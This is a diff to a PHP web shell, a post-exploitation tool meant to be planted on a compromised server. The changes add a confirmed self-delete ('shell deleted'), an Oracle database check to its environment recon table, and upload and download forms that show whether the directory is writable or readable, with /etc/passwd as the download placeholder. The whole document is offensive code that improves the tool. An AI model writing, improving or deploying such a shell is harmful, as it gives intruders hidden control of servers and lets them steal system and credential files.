@@ -166,7 +166,17 @@ if (isset($_POST["dir"]))
 	if (is_dir($dir)) { chdir($dir); }
 }
 
-if (isset($_POST["kill"])) { unlink(__FILE__); }
+if (isset($_POST["kill"]))
+{
+	if (unlink(__FILE__))
+	{
+		show_alert("[+] success: shell deleted"); exit();
+	}
+	else
+	{
+		show_alert("[-] error: shell not deleted");
+	}
+}
 
 echo( sprintf("
 <!DOCTYPE html>
@@ -248,7 +258,7 @@ echo( sprintf("
 		<tr><td>Group</td><td>%s</td></tr>
 		<tr><td>System</td><td>%s</td></tr>
 		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b> %s</td></tr>
-		<tr><td>PHP Extensions</td><td>cURL: <b>%s</b> rar: <b>%s</b> zip: <b>%s</b> | MySQL/MariaDB: <b>%s</b> MongoDB: <b>%s</b> PostgreSQL: <b>%s</b> | SSH2: <b>%s</b> FTP: <b>%s</b></td></tr>
+		<tr><td>PHP Extensions</td><td>cURL: <b>%s</b> rar: <b>%s</b> zip: <b>%s</b> | MySQL/MariaDB: <b>%s</b> MongoDB: <b>%s</b> PostgreSQL: <b>%s</b> Oracle: <b>%s</b> | SSH2: <b>%s</b> FTP: <b>%s</b></td></tr>
 		<tr><td>Current Directory</td><td>%s</td></tr>
 		<tr><td>Free / Total disk space</td><td>%s / %s (%s)</td></tr>
 	</table>
@@ -264,7 +274,7 @@ echo( sprintf("
 	((int) ini_get("safe_mode")) ? "ON": "OFF",
 	(function_exists("get_magic_quotes_runtime") AND get_magic_quotes_runtime()) ? "ON" : "OFF",
 	error_reporting(),
-	$disable_functions == "" ? "none" : $disable_functions,
+	$disable_functions == "" ? "all functions available" : $disable_functions,
 	"<a href=" . $shell . '/?php_info' . ">[ phpinfo ]</a>",
 	extension_loaded("curl") ? "ON" : "OFF",
 	extension_loaded("rar") ? "ON" : "OFF",
@@ -273,6 +283,7 @@ echo( sprintf("
 	extension_loaded("mysqli") ? "ON" : "OFF",
 	extension_loaded("mongodb") ? "ON" : "OFF",
 	extension_loaded("pgsql") ? "ON" : "OFF",
+	extension_loaded("oci8") ? "ON" : "OFF",
 
 	extension_loaded("ssh2") ? "ON" : "OFF",
 	extension_loaded("ftp") ? "ON" : "OFF",
@@ -435,7 +446,8 @@ if ($cwd)
 <form action="<? echo($shell); ?>" method="POST" enctype="multipart/form-data">
 	<label for="upload">File:</label>
 	<input type="file" id="upload" name="upload">
-	<input type="submit" value="Upload">
+	<input type="submit" value="Upload" <?php if (!is_writable($cwd)) { echo("disabled"); } ?>>
+	[ cwd <?php echo(is_writable($cwd) ? "is" : "is not"); ?> writable ]
 </form>
 
 <?php if (isset($result_u)) { show_alert($result_u); } ?>
@@ -443,7 +455,8 @@ if ($cwd)
 <form action="<? echo($shell); ?>" method="POST">
 	<label for="download">File:</label>
 	<input type="text" id="download" name="download" placeholder="/etc/passwd">
-	<input type="submit" value="Download">
+	<input type="submit" value="Download" <?php if (!is_readable($cwd)) { echo("disabled"); } ?>>
+	[ cwd <?php echo(is_readable($cwd) ? "is" : "is not"); ?> readable ]
 </form>
 
 <?php if (isset($result_d)) { show_alert($result_d); } ?>
